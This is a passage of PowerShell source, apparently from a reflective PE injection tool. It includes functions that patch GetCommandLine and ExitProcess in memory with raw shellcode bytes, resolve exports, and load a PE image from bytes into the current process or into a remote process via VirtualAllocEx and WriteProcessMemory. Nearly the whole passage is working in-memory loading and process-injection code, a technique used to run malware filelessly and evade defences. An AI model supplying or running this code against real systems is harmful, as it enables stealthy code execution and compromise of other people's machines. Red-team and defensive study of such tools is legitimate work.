						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
